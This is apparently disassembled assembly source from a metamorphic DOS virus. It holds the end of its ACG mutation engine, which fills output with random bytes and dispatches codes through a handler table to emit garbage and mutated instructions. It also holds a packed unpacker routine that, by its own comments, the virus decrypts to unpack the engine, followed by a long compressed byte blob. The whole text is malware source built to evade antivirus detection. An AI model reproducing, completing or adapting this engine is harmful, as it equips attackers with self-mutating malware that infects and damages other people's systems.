; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_VOID proc near
   mov	SaveFlags, 0	 ; allow modification of flags
   call	_Generate_4times_Garbage
   call	_Generate_4times_Garbage
   jmp	Generate_4times_Garbage
ACGCODE_VOID endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_CSPREF proc near
   mov	byte ptr CSPREF, 1
   mov	CSPREF_2, 1
   retn
ACGCODE_CSPREF endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_DSPREF proc near
   mov	byte ptr CSPREF, 0
   mov	CSPREF_2, 0
   retn
ACGCODE_DSPREF endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_SETSTACK proc near
   call	_get_offset_Variable ; get reg/mem where SS is stored
   mov	si, 2		 ; (select SS)
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 8Eh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Generate_ModRM	 ; MOV SS,reg/mem
   call	_get_offset_Variable ; get reg/mem where SP is stored
   cmp	Instruction, 2Eh
   jnz	loc_0_2BA8
   cmp	edi, 8
   jb	loc_0_2BA8
   call	_Store_Instruction_Byte2 ; if a	CS was needed for SS, use it for SP (because once it is	generated it wont be generated for a second memory access)
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 2Eh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2BA8:		 ; reg SP
   mov	esi, 4
   mov	bh, 0FFh
   mov	bl, 2
   mov	cl, 2
   call	Do_Instruction	 ; MOV SP,reg/mem
   retn
ACGCODE_SETSTACK endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACG_Mutate proc	near
   and	D_ERRCODE, 0	 ; error code
   mov	saved_SP, sp	 ; save	SP
   mov	edx, D_STSD
   mov	pACGCODE, edx	 ; save	pointer	to ACGCODE
   mov	Memory_Segment_Register, 0FFh ;	no prefix stored
   mov	Mutation_Level,	5
   or	Return_Offset, 0FFFFh
   cld
   xor	di, di		 ; ES =	D_CODESEG
   mov	cx, D_CODESIZE	 ; mutated code	size

Fill_Output:		 ; get random word
   call	_getRND_in_DX
   mov	al, dh
   push	cx
   mov	cl, dl
   rol	al, cl		 ; play	with it	 :-)
   pop	cx
   stosb		 ; store random	byte
   loop	Fill_Output
   mov	cx, 8000h

Fill_Output2:		 ; get random offset
   call	_getRND_in_DX
   cmp	dx, D_CODESIZE
   jnb	outside_codesize
   mov	di, dx
   call	_getRND_in_DX	 ; get random word
   mov	es:[di], dh	 ; store random	byte

outside_codesize:
   loop	Fill_Output2
   push	es
   push	fs
   pop	es		 ; ES =	D_CODEMAPSEG
   assume ds:nothing
   xor	di, di
   mov	cx, ds:D_CODESIZE
   mov	al, 0
   repe	stosb		 ; store zeros in CODEMAPSEG
   pop	es
   push	es
   push	gs
   pop	es		 ; ES =	D_WPSEG
   xor	di, di
   mov  cx, 11Ch         
   mov	al, 0
   repe	stosb		 ; store zeros in workplace
   pop	es
   mov	dword ptr fs:0,	1010101h ; mark	first 4	bytes as used (reserve space for jump)
   and	ds:Instruction_Offset, 0
   mov	bx, offset Instruction_Offset

Init_Array1:		 ; reset variables
   mov	byte ptr [bx], 0
   inc	bx
   cmp	bx, offset DecryptType0
   jnz	Init_Array1
   mov	byte ptr [bx], 0FFh ; reset variable
   xor	bx, bx

Init_Array2:		 ; all regs free for use now
   mov	byte ptr ds:Free_AX[bx], 1
   inc	bx
   cmp	bx, 10h
   jb	Init_Array2
   call	ds:_getRND_in_DX
   mov	bx, dx
   and	bx, 1Ch
   mov	eax, dword ptr ds:Segment_Table[bx] ; choose segments
   mov	dword ptr ds:Segment_Selection,	eax ; store selection
   test	byte ptr ds:D_SEL_DWORD, 1
   jnz	Dont_Include_ACG
   call	get_Space_for_StaticData
   mov	eax, ds:StaticData_ACGCODES_Pointer
   mov	ds:StaticData_ACGCODES_Start, eax

Dont_Include_ACG:
   call	Choose_Encryption
   call	ds:_getRND_in_EDX
   mov	ds:dword_0_26F,	edx
   call	ds:_getRND_in_DX
   xchg	ax, dx
   call	ds:_getRND_in_DX
   sub	ax, dx
   jnb	loc_0_2C91
   neg	ax

loc_0_2C91:
   mov	ds:RandomWORD1,	ax

Next_ACGCODE:		 ; allow modification of flags
   mov	ds:SaveFlags, 0

Next_ACGCODE2:
   call	ds:_Get_ACGCODE_Byte
   push	ax
   mov	si, offset TABLE_ACG_CODES

Check_ACG_Code:
   pop	bx
   lodsw
   or	ax, ax
   mov	ds:ErrorCode, 24h ; 24h	means invalid ACG-Code
   jz	loc_0_202
   mov	cl, 40h
   cmp	ax, offset ACGCODE_Operation
   jz	loc_0_2CCD
   mov	cl, 20h
   cmp	ax, offset ACGCODE_Jump
   jz	loc_0_2CCD
   mov	cl, 4
   test	ax, 4000h
   jnz	loc_0_2CCD
   mov	cl, 10h
   test	ax, 8000h
   jnz	loc_0_2CCD
   mov	cl, 1

loc_0_2CCD:
   and	ax, 3FFFh
   xchg	ax, dx		 ; DX =	routine
   lodsb
   push	bx
   sub	bl, al
   cmp	bl, cl
   jnb	Check_ACG_Code
   inc	sp
   inc	sp
   xchg	ax, bx		 ; AX =	ACG code (relative to base code	that DX	routine	handles)
   call	dx		 ; interpret ACG code
   jmp	short Next_ACGCODE
ACG_Mutate endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Finish_Compilation proc	near
   inc	sp
   inc	sp
   xor	ax, ax
   xor	si, si

loc_0_2CE6:
   cmp	byte ptr fs:[si], 1
   sbb	ax, 0FFFFh
   mov	byte ptr fs:[si], 0
   inc	si
   cmp	si, ds:D_CODESIZE
   jb	loc_0_2CE6
   mov	ds:D_USED_BYTES, ax

ACG_Exit2:
   retn
ACGCODE_Finish_Compilation endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
TABLE_ACG_CODES	dw offset ACGCODE_Declare_Local_Variable+4000h
   db 4			 ; ACG-Codes 04..07
   dw offset ACGCODE_Free_Local_Variable
   db 3			 ; ACG-Code 03
   dw offset ACGCODE_Offset
   db 0Eh		 ; ACG-Code 0E
   dw offset ACGCODE_Prefix_Segment+8000h
   db 10h		 ; ACG-Code 10..1F
   dw offset ACGCODE_Operation
   db 40h		 ; ACG-Codes 40..7F
   dw offset ACGCODE_Inc+4000h
   db 38h		 ; ACG-Codes 38..3B
   dw offset ACGCODE_Dec+4000h
   db 3Ch		 ; ACG-Codes 3C..3F
   dw offset ACGCODE_Push+4000h
   db 30h		 ; ACG-Codes 30..33
   dw offset ACGCODE_Pop+4000h
   db 34h		 ; ACG-Codes 34..37
   dw offset ACGCODE_MOV_seg_mem+8000h
   db 0C0h		 ; ACG-Codes C0..CF
   dw offset ACGCODE_MOV_mem_seg+8000h
   db 0E0h		 ; ACG-Codes E0..EF
   dw offset ACGCODE_Declare_IP
   db 8			 ; ACG-Code 08
   dw offset ACGCODE_Declare_Target_Jump
   db 9			 ; ACG-Code 09
   dw offset ACGCODE_Adjust_and_Jump
   db 0Ah		 ; ACG-Code 0A
   dw offset ACGCODE_Jump
   db 80h		 ; ACG-Codes 80..9F
   dw offset ACGCODE_Declare_Global_Variable
   db 0Bh		 ; ACG-Code 0B
   dw offset ACGCODE_Proc
   db 28h		 ; ACG-Code 28
   dw offset ACGCODE_EndProc
   db 29h		 ; ACG-Code 29
   dw offset ACGCODE_Return_Variable
   db 2Ah		 ; ACG-Code 2A
   dw offset ACGCODE_Call_Proc
   db 2Bh		 ; ACG-Code 2B
   dw offset ACGCODE_ASM
   db 2Ch		 ; ACG-Code 2C
   dw offset ACGCODE_GETSD
   db 25h		 ; ACG-Code 25
   dw offset ACGCODE_STARTSD
   db 24h		 ; ACG-Code 24
   dw offset ACGCODE_STATICDATA
   db 26h		 ; ACG-Code 26
   dw offset ACGCODE_SAVEFLAGS
   db 20h		 ; ACG-Code 20
   dw offset ACGCODE_FREEREGS
   db 0F1h		 ; ACG-Code F1
   dw offset ACGCODE_ALLOCREGS
   db 0F2h		 ; ACG-Code F2
   dw offset ACGCODE_IF
   db 0F0h		 ; ACG-Code F0
   dw offset ACGCODE_Rotate+4000h
   db 0F4h		 ; ACG-Codes F4..F7
   dw offset ACGCODE_Shift+4000h
   db 0F8h		 ; ACG-Codes F8..FB
   dw offset ACGCODE_VOID
   db 0FEh		 ; ACG-Code FE
   dw offset ACGCODE_CSPREF
   db 2			 ; ACG-Code 02
   dw offset ACGCODE_DSPREF
   db 1			 ; ACG-Code 01
   dw offset ACGCODE_SETSTACK
   db 27h		 ; ACG-Code 27
   dw offset ACGCODE_Finish_Compilation
   db 0FFh		 ; ACG-Code FF
   dw 0
ACG_End	db 0F0h
seg000 ends


   end 
ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ[ACG.ASM]ФФФ
ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ[ACGPACK.ASM]ФФФ
;When the virus wants to mutate, its metamorphic code decrypts this routine,
;which in turn unpacks the metamorphic engine code.

;If you want to debug the virus highly metamorphic code, until it reaches
;the "Unpacker_Start" label, you should try the ACG compiler package, which
;must be somewhere on internet.

; ЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭ

; Segment type:	Regular
seg000 segment byte public '' use16
   assume cs:seg000
   org 100h
   assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
off_0_100 dw offset Unpacker_End - offset Unpacker_Start
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Unpacker_Start:
   push	ds
   push	es
   push	cs
   pop	ds
   assume ds:seg000
   push	cs
   pop	es
   assume es:seg000
   mov	si, offset Unpacker_End-1 ; end	of unpacker
   mov	di, 3FFFh	 ; end of 16 Kb
   mov	cx, offset Unpacker_End	- offset Unpacker_Data
   std			 ; backwards
   repe	movsb		 ; copy	compress data +	unpacker code
   cld			 ; forwards
   mov	si, di
   inc	si		 ; ESI = start of compressed data
   mov	di, 100h	 ; EDI = 100
   mov	dx, 1		 ; DX =	1
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
Jump_to_Unpack db 0E9h
   dw (4000h - (offset Unpacker_End - offset Unpack)) -	offset Unpacker_Data
Unpacker_Data db 0C8h,	 5, 8Bh, 32h,	3,0C0h,	33h, 91h,0F2h, 2Ch, 30h, 22h, 5Eh, 17h,	1Ch, 90h
   db	 7, 12h,   8,	0, 34h,	  0,0EAh,0C1h, 92h, 75h, 84h, 4Ah,0C4h,0C4h, 38h, 45h
   db  24h, 32h, 1Dh, 6Ch,0D0h,0B2h,0F0h, 6Fh, 22h, 75h,0D1h,	2, 13h,	7Ch, 2Ah, 65h
   db 0E8h, 4Eh, 29h, 87h, 63h,	90h, 8Ah, 3Fh,0CEh,0D4h,   4,0E3h,0BBh,	  8,0D6h,0A5h
   db 0C9h, 68h,   2, 2Ah,0C2h,	9Fh, 8Dh,0C4h, 24h,0FCh,0AFh, 44h, 1Bh,	12h,0FEh, 59h
   db 0C9h, 84h, 25h,0FCh,0FCh,	8Bh, 6Ch, 49h, 81h, 63h, 23h, 26h, 85h,	43h, 73h,0B2h
   db  8Bh, 6Eh, 61h,0CAh,0B4h,	41h, 85h,0FFh, 20h,0C1h,0BFh, 44h, 20h,0BAh, 21h, 3Ah
   db  25h, 1Eh, 48h,0F5h, 1Eh,	1Ch,0B9h,   8, 75h, 92h, 57h,	1, 59h,	56h, 46h, 97h
   db  28h, 50h,0E9h, 76h, 2Ah,0CBh, 84h, 6Bh, 2Eh, 54h, 16h, 62h, 8Ch,	70h, 5Eh, 48h
   db  29h,0F0h, 81h, 80h, 30h,0ACh, 14h, 3Ah, 7Ah,   0, 8Dh,	1, 61h,	  3, 89h, 80h
   db  24h, 78h,0E8h,0C0h, 0Ah,	4Dh, 85h, 6Ah, 0Ah,0CEh, 44h, 40h,0B8h,	  5,0C4h, 12h
   db 0C4h, 9Ch,0B0h, 59h, 62h,	4Ah, 98h, 27h, 19h, 19h,   8, 34h, 28h,	56h, 6Ah, 0Ah
   db	 3,   8, 77h, 55h, 6Dh,	35h, 80h,0FFh,0B5h,0D5h,   1,0F4h,0AAh,	47h, 11h, 0Eh
   db  62h, 51h,0B8h, 0Eh, 4Bh,	  7,0A5h, 67h,0A7h, 66h, 54h,0A8h, 93h,0F3h, 4Bh,   9
   db 0DEh,   2, 4Dh,0FEh,   9,	19h, 78h,0D4h,	 3, 22h, 9Ch, 2Dh, 44h,	48h, 61h,   8
   db 0D4h, 61h, 0Bh, 8Bh, 20h,	1Ch,0F6h, 18h, 81h, 6Fh, 2Eh, 40h, 8Bh,	  7, 0Fh,0C5h
   db  12h,0BEh,0E0h, 82h, 3Fh,0F8h, 8Fh,0F0h,0F0h,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,   7
   db 0FFh,0FFh, 0Fh,0E0h,0FFh,	1Fh,0C0h,0FFh, 3Fh, 80h,0FFh,0FFh,   0,0FFh,0FFh,0FFh
   db 0FEh,0FFh,0FFh, 7Fh,0FFh,0FFh,0FFh,   0,0FFh,0FFh,   1,0FCh,0FFh,	  3,0F8h,0FFh
   db  1Ah, 3Dh, 80h,0FFh,0C4h,	  5, 33h,0E3h, 49h, 28h, 28h, 10h,0B8h,	  1,0DDh,0D4h
   db  4Ch, 5Ch, 78h, 94h, 27h,	8Eh, 90h, 38h, 1Dh, 60h, 0Bh, 0Ah, 1Bh,0A0h,0C5h, 1Eh
   db 0A2h,0D2h,   6, 41h,0C3h,0B0h, 90h, 33h, 7Bh,0E6h, 12h, 5Dh, 4Eh,0B8h, 80h,0B8h
   db	 5, 61h, 2Bh, 1Ch, 33h,	58h,0F0h, 5Fh, 8Fh,0DEh, 80h, 14h,0E9h,	41h, 3Dh,0D0h
   db  77h, 90h, 7Eh,	2,   9,0D0h,0D2h, 53h, 4Eh, 7Fh, 5Eh,0D0h, 60h,0EFh,0E0h, 89h
   db 0D2h,0E8h, 5Bh, 31h,0F5h,0C0h, 84h,   7, 3Dh, 10h, 2Ah, 4Ch, 4Ch,	3Dh, 2Ch,0BBh
   db  38h, 45h, 58h, 5Bh, 97h,	86h, 0Ah, 3Ch, 18h, 2Dh, 7Eh, 9Fh,0A1h,	64h, 6Eh, 68h
   db 0F0h,0F0h,0BEh, 33h,0A0h,	  2, 75h, 40h, 20h,0ABh,0C6h,	1, 95h,	29h, 4Bh, 1Dh
   db  1Bh,0A0h, 6Dh,0D1h, 1Dh,	32h,0E4h, 64h,	 3, 40h, 89h, 87h,0E9h,	9Bh,0B2h,0B8h
   db  1Dh,   2,0F9h,	6, 12h,	  1, 61h, 29h, 32h,0DDh, 69h,	4,0FBh,	2Fh, 0Fh, 20h
   db  2Eh,0B9h, 50h, 87h, 62h,0C2h,0B2h, 27h,0ABh, 49h, 6Fh,0F9h, 31h,	81h, 3Eh,0DFh
   db  1Eh, 87h, 7Dh,0FAh, 5Bh,	76h, 74h,0CCh, 81h, 32h,0F1h,	0,0D5h,0BFh,0A2h, 5Ch
   db	 6, 6Bh, 41h,0AFh, 96h,	79h, 8Ch,0BCh,0BCh, 3Ah, 4Fh,0B4h,   7,	8Bh, 1Ch, 7Ch
   db  94h,0ADh, 78h, 69h,0D7h,	83h, 0Bh, 73h, 22h, 44h, 22h,0BCh, 5Ch,	91h,0FAh, 81h
   db  8Fh, 0Ch, 32h, 84h, 4Eh,0DDh, 34h, 0Dh, 69h,0A4h, 0Eh,0B7h,0C0h,	6Bh, 1Bh, 90h
   db  47h, 74h, 25h,0EFh, 82h,	3Ch,0F1h, 50h, 2Ch, 91h,0ACh, 87h, 90h,	1Fh, 4Ah, 94h
   db  82h, 0Eh, 63h,0A8h, 3Eh,0AFh,0C3h,0EFh,0B4h,   5,0D7h, 3Ah,0FDh,0C2h, 78h,0B4h
   db  56h,0EBh,0CAh, 19h,0ADh,	2Ch,0A4h, 68h, 80h, 1Ch, 20h, 7Ah, 16h,0C0h, 98h, 6Bh
   db 0E1h, 17h,0E2h, 3Fh, 7Dh,0CDh, 0Bh, 1Eh, 80h, 31h, 32h, 1Dh, 27h,	0Eh, 1Ah,0A0h
   db 0D9h,0FEh,   2,0CDh,0A7h,0D0h, 54h,0F4h, 96h, 52h,0AAh, 5Bh,   1,	5Eh, 7Ch, 18h
   db  83h, 4Eh,0E9h, 0Ah, 33h,	17h, 9Ch, 63h,0F7h, 2Fh, 10h, 80h, 1Bh,	3Dh, 67h,   4
   db  51h,0E1h,0C9h,	0,0D0h,	3Ah, 87h, 36h, 40h, 67h, 9Ah, 0Fh,0D1h,	74h,   8, 37h
   db  4Ch,0BFh, 47h,0B4h,0EDh,	5Ch, 51h,0B4h,0FFh, 84h,0A1h,0EBh,0DCh,	42h,0A2h, 2Ch
   db  72h,0F8h,0AFh,0D1h,0EBh,0FCh, 55h, 99h, 5Ch, 22h, 2Ah,0BBh,0C3h,0BEh, 68h,0A9h
   db 0CDh,0C3h,0A2h, 29h, 39h,	34h, 15h, 60h,0EEh, 1Dh, 32h,0DAh,0E1h,0F3h,0D2h, 11h
   db 0B6h, 2Dh, 58h,	2, 94h,	22h,   5, 78h, 67h, 44h, 54h,0F9h, 15h,	6Fh,0DDh, 78h
   db	 6,0FEh, 21h, 16h, 60h,0CCh,0BAh,0E3h, 7Dh, 3Ch, 3Ch,0DEh, 20h,	6Ch, 10h,   3
   db  33h,0B5h,0A0h, 27h,   0,	9Ch, 6Eh,0AAh, 35h, 3Ch, 98h,0D9h,0CCh,	74h, 8Dh, 7Dh
   db  45h, 50h, 2Eh,0E8h, 62h,	6Fh, 86h,0B6h,0A2h,   9, 29h,0B2h, 23h,	  0, 86h, 7Ah
   db  27h, 27h,0DEh, 0Eh, 3Eh,0BCh, 2Bh,0A7h,0EAh, 6Ch,   3,0BCh,0FAh,0A3h, 8Bh, 0Eh
   db  74h, 58h, 98h,	3, 0Dh,	60h,0CFh, 46h, 9Ch, 58h, 31h, 32h, 76h,	73h, 45h, 50h
   db  2Fh,0C2h, 22h,	5,   0,0D2h,0EAh, 87h, 13h,0DBh, 6Bh, 7Ch, 36h,	  7,0B9h,0A0h
   db  6Ah, 83h, 61h, 81h,   9,	1Eh, 20h, 0Dh, 5Eh, 47h, 10h,0A6h, 68h,	63h,0E4h, 30h
   db  8Ch,0DDh, 11h,0C3h, 30h,	92h, 19h, 29h,0C1h, 58h, 66h, 84h, 9Dh,	  0, 28h, 9Eh
   db  73h,   1,0EBh,0C0h,0D7h,0FFh, 9Eh,0A0h,	 1,0A2h, 97h, 32h,0B1h,	30h,0FCh, 69h
   db 0CEh, 24h, 83h, 35h, 16h,	26h, 20h, 2Ah,	 4,0C7h, 41h, 2Ch, 14h,	83h, 39h,0D3h
   db  6Bh, 81h,0CEh,0D8h, 6Dh,0EBh,0B4h,0FCh, 67h,   6, 8Ah, 94h, 74h,0B3h, 1Fh,0BBh
   db 0B9h,0E8h, 5Bh,	7, 16h,	0Ah,0ACh,0C1h, 14h,0D2h, 57h, 45h,0E1h,	59h, 30h,0EDh
   db  2Dh, 7Ch,0ADh, 0Ah, 24h,	5Ah, 51h, 89h,	 2, 1Dh,   3,0FAh, 84h,	51h,0BBh,0C0h
   db 0D4h, 1Ah,0E8h, 8Ah,   1,0C4h, 8Ah,0FAh, 80h,0C0h, 9Ch, 2Fh,   5,0ACh,   3,0C2h
   db  1Bh, 64h, 65h,0A9h, 88h,0C1h, 0Eh, 98h, 17h, 63h, 0Bh,	6, 53h,0A4h,   2,0BDh
   db 0B4h, 92h,0C3h, 82h,0F0h,	30h, 80h,0CEh,0EEh, 0Ah, 74h,	4,0E6h,	27h, 63h,0CFh
   db  5Eh, 28h,   3, 8Ch, 7Fh,0D3h, 16h,0A0h,0DFh,0C1h, 3Ah, 0Fh,0A6h,0A8h,0F0h, 81h
   db  2Dh, 59h,0D0h, 27h, 90h,	0Fh,0D0h, 30h,0EBh, 62h, 83h, 26h,0A0h,	70h, 33h, 53h
   db 0E3h, 8Eh, 72h, 10h, 9Fh,0DBh, 8Ah, 94h,0C9h, 38h, 20h,0BDh,0C9h,	5Bh,   1, 80h
   db  20h, 38h,0C6h,	6,   7,	0Ah,0CEh, 5Fh, 5Fh,0AAh, 25h, 72h,0F5h,	28h,0D6h,0D0h
   db  8Bh, 36h,0F4h, 96h,   8,0DDh,0DAh, 35h, 61h, 0Ah, 88h,	5,0F3h,0F1h, 94h, 0Dh
   db 0C0h, 42h,   0,0AEh, 77h,0F9h,   2,0E0h, 51h, 0Bh, 1Bh,0F0h,0DAh,	0Ah,   3, 7Ah
   db  81h,0D2h,0D1h,0D0h, 61h,0A9h, 20h, 32h, 56h,0FCh, 17h,0D7h,0FEh,	2Eh,0A6h,0E9h
   db 0B4h,   0,0A9h, 84h, 6Ch,	6Eh,0DFh, 73h,0CDh, 34h,0FEh, 34h,   3,	10h,0FFh, 80h
   db  58h, 0Fh, 0Ch, 7Ch,0A3h,0FCh, 3Fh, 20h,0A2h, 2Ah,0FFh,0FFh, 65h,0EAh, 8Fh, 4Ah
   db  6Fh, 25h,0A4h,0AEh,0FFh,	3Fh, 3Ah, 16h,0B6h, 49h,0FCh,0FFh,0D0h,	4Ah,0D4h,0BDh
   db  84h, 3Ah,0FFh, 95h,   4,	9Fh, 63h, 0Eh, 10h, 76h, 40h, 1Eh,0A0h,	8Bh, 72h,0EFh
   db  35h, 45h, 1Ah, 4Eh, 6Eh,	50h, 34h, 4Bh,0B6h, 63h, 3Ch, 20h, 84h,	41h,0D0h,0B1h
   db 0CBh, 1Bh,0C8h, 6Bh,   0,	0Eh,0BCh,0D1h, 82h, 52h, 5Fh, 61h, 27h,0DDh,   5, 3Eh
   db	 7,0F9h, 47h, 59h, 11h,	3Ah,0F7h, 3Eh,0D1h, 39h, 5Eh, 4Eh,0E6h,	20h,0F0h, 27h
   db  30h, 87h,0D2h,0B7h, 24h,	2Eh, 13h,   7,0F8h,0FAh,0D3h, 3Dh,0A8h,	6Fh, 8Ah, 43h
   db  48h,   5, 2Eh, 29h, 5Eh,0EAh,0E4h, 74h,0D6h, 99h,0FFh, 17h,0A3h,	53h, 6Ch,   8
   db  6Fh,0ECh,   3,0FAh,0BFh,	70h, 47h,0A0h, 40h, 1Fh, 7Ah,	9, 82h,	2Eh,0BAh,0FBh
   db  30h,   0, 66h, 28h,0DBh,	31h,   0, 5Dh, 91h,0F8h,0BEh, 42h, 21h,0B0h, 0Fh, 90h
   db 0A5h,0F2h, 83h,0C8h, 56h,	14h, 3Ah, 7Fh, 69h, 33h,0C8h,0BAh, 12h,	3Dh, 48h, 7Ah
   db 0B8h, 22h, 4Fh,0F0h, 23h,	15h, 10h, 99h,	 2, 75h,0C1h,0CEh,0F9h,	62h, 4Fh, 1Ch
   db 0DCh, 3Eh,   6, 64h, 7Ch,	16h, 68h, 3Ah, 2Bh, 80h,   1, 70h, 15h,0A0h, 13h, 30h
   db 0A8h, 4Ah, 80h, 34h, 18h,	96h,0F7h,0B7h,0AAh,0F1h,   1, 68h, 77h,0E8h,0FCh,0C3h
   db  1Ch,0D2h, 0Ah,0D9h,0DFh,	8Eh,0F9h,0BFh, 8Eh,   2, 66h,0CCh, 86h,	16h,0D2h, 9Ch
   db	 7,0FDh, 67h, 77h,0F0h,0A0h, 67h, 82h, 14h, 90h,0D5h, 47h, 5Ah,	84h, 1Eh, 82h
   db  59h,0E8h,0C8h, 1Ah, 35h,0F6h,0A0h, 37h,0F8h, 7Fh, 20h,0F4h, 61h,	59h,0B4h, 48h
   db 0BEh,0C1h, 0Fh,0F1h, 39h,	  5, 74h, 17h,0C2h, 7Fh, 8Ah,	7,0F4h,0C1h, 20h, 5Eh
   db  64h, 83h, 3Ah,0CDh,0F4h,	  8, 24h,0EDh, 20h,0E8h,   1, 12h, 0Fh,0ADh, 6Ch,   6
   db 0FDh, 34h, 57h, 44h, 3Fh,	5Ah, 6Bh, 27h, 38h, 22h, 58h,0D7h, 35h,	59h,0D0h,0E9h
   db	 6, 9Ch,   3,	6,0EFh,0C8h, 63h,   2, 2Ah,0DDh, 30h,0C2h, 28h,0FDh, 2Ah, 7Dh
   db  33h, 15h, 7Ah, 80h, 72h,	7Ah, 10h,0A0h,	 0, 5Ch, 65h, 17h,0A5h,	1Bh, 8Ch,0FEh
   db  4Ch, 40h, 67h, 37h, 69h,0B6h,0B7h,0C0h, 0Dh,0A5h,0A0h,	3, 2Eh,0BCh,0B9h,0C4h
   db  75h,0F7h, 80h, 80h, 4Eh,	1Dh, 2Ch, 66h,0C5h, 2Fh, 0Ch, 34h,   2,	  8, 80h, 82h
   db 0D0h,0FFh, 30h, 15h, 6Fh,	26h,0FDh,0E3h, 9Fh, 75h, 64h,0D2h,0F3h,	4Fh,   0, 56h
   db 0D9h, 7Eh,0F8h, 1Fh,0B1h,	6Eh, 5Bh, 3Fh, 40h, 6Fh, 6Fh, 86h, 98h,0A6h, 19h,   9
   db  79h,0A6h,0E6h, 46h,0E4h,0D3h, 45h,0B4h, 84h, 4Ah,0DBh,0ADh,0EFh,0D7h,   3, 33h
   db  6Ah, 2Ch,0D0h, 68h, 4Eh,0D1h,0DBh, 7Ah, 52h, 5Bh, 8Ah, 6Eh,0ABh,	20h, 58h,   5
   db 0BCh, 45h, 61h, 32h, 47h,0E0h, 2Eh,0D8h,0E8h, 97h,0A2h,0FFh, 94h,0B5h, 86h, 96h
   db  47h,0BFh,0F6h,0A2h, 96h,	35h, 56h, 63h,0A2h,0E7h, 45h,0BFh,0E5h,0EDh, 55h,0E7h
   db  8Bh,0FEh, 9Fh, 70h,0FFh,	4Dh, 63h, 51h, 16h, 20h, 88h,0D3h, 2Fh,0E7h, 75h,0B7h
   db  8Ah, 92h, 39h, 34h, 68h,	6Ch, 91h, 16h,	 1,0A0h,0F8h, 5Ah, 80h,	49h,0FAh,0D2h
   db  80h,0ADh,   1,0E2h, 85h,0E8h,0C8h,0E3h,	 6, 4Ah,   2,0E5h, 16h,	28h, 23h, 94h
   db 0E5h, 82h,0B2h, 5Ah,0B0h,	3Ch, 4Bh, 23h, 96h, 0Eh, 8Bh, 96h, 62h,0D2h,0FBh, 13h
   db 0C0h, 98h,0A2h, 46h,0D2h,	5Dh, 3Eh,0AAh, 9Ah,0E9h, 37h, 52h, 5Fh,	7Eh, 33h,   0
   db  42h, 37h, 94h, 61h, 5Dh,0E9h, 83h,0EBh, 6Fh, 80h, 41h, 23h,0FFh,0C6h,   0,0A1h
   db 0CAh, 36h, 40h,0E8h,0D2h,0F1h,0A1h,0DFh, 61h,   7,0B3h, 83h,0C7h,0C2h, 52h, 60h
   db 0C1h, 3Ah, 6Ah,0E8h, 7Ch,	8Dh, 33h, 9Eh,0FAh,0E9h,0E8h,	6, 88h,	8Dh,0A5h, 42h
   db 0F8h,0FFh, 1Dh,0EEh, 8Bh,0FFh,0DFh,0B2h, 5Bh,0EFh,0EBh, 11h, 2Bh,	67h,0F1h, 63h
   db  48h, 96h,0FFh,0FFh, 1Ah,	81h,0C5h, 1Fh, 42h,0FFh, 1Ch, 3Dh, 7Ch,	8Ch,0FFh, 97h
   db  19h,0FFh,0FFh,0BDh,0F8h,0FFh, 3Fh, 12h,0F8h,0BFh, 6Eh,0CBh, 9Bh,0D8h, 0Ch,0CBh
   db  43h, 9Fh, 2Fh,0F4h, 16h,0DDh,0D1h,   2, 96h, 15h, 33h, 53h, 24h,	47h, 93h,0FEh
   db  6Ah, 3Ah,0CBh,0F2h,0FFh,0DFh,0E2h, 25h,0C4h, 6Bh, 1Ah,0F1h,0F1h,0FFh, 5Fh, 60h
   db  83h,0A5h,0E7h, 1Fh,   1,	65h,0FEh,0DBh, 0Ch,0E8h,0FFh,0FFh,0A8h,0EFh,0F0h, 7Fh
   db  94h, 0Eh,0FFh,0D3h, 98h,	43h, 80h,   7,0A2h, 24h,0A9h, 1Fh,0CCh,0F8h, 5Dh, 67h
   db  8Ch,0F5h, 52h, 1Fh,0FDh,	43h,0EEh,   6,0F4h, 4Fh, 70h, 2Eh,0EFh,	40h, 4Eh, 57h
   db 0FEh, 19h, 91h, 42h, 8Ah,	62h,0D1h, 38h,	 6, 35h, 8Fh, 2Eh,   3,	82h, 87h,   1
   db	 3,0CDh, 23h, 97h, 88h,	8Ah, 83h,0C4h,0D6h,   9,0F5h, 0Fh, 41h,	42h, 27h, 20h
   db  7Fh, 2Ch, 59h,0FCh, 74h,	90h, 83h, 21h,0F2h,0FFh,0D3h,0F7h, 92h,0FFh, 3Bh, 42h
